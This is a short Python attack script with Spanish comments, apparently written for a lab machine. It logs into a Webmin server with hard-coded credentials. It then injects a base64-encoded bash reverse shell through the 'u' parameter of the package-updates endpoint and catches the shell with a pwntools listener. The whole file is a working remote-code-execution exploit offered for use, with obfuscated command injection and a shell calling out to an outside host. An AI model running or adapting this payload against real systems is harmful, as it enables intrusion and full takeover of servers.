#!/usr/bin/python3

from pwn import *
import requests, urllib3, pdb, signal, sys, time, threading

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#Variables globales
login_url = "https://10.129.2.1:10000/session_login.cgi"	      #CAMBIAR
update_url = "https://10.129.2.1:10000/package-updates/update.cgi"     #CAMBIAR
lport = 443    #CAMBIAR

def makeRequest():

	urllib3.disable_warnings()
	s = requests.session()
	s.verify = False

	data_post = {
		'user': 'Matt',			#CAMBIAR
		'pass':	'computer2008'		#CAMBIAR
	}

	headers = {
		'Cookie': 'redirect=1; testing=1; sid=x'		#CAMBIAR
	}

	r = s.post(login_url, data=data_post, headers=headers)

	post_data = [('u', 'acl/apt'),('u', '  | bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjcvNDQzIDA+JjEK | base64 -d | bash"'), ('ok_top', 'Update+Selected+Packages')]	#CAMBIAR

	headers = {
		'Referer': 'https://10.129.2.1:10000/package-updates/?xnavigation=1'  #CAMBIAR
	}

	r = s.post(update_url, data=post_data, headers=headers)

	print(r.text)

if __name__ == '__main__':

	try:
		threading.Thread(target=makeRequest, args=()).start()
	except Exeception as e:
		log.error(str(e))

	shell = listen(lport, timeout=20).wait_for_connection()
	shell.interactive()
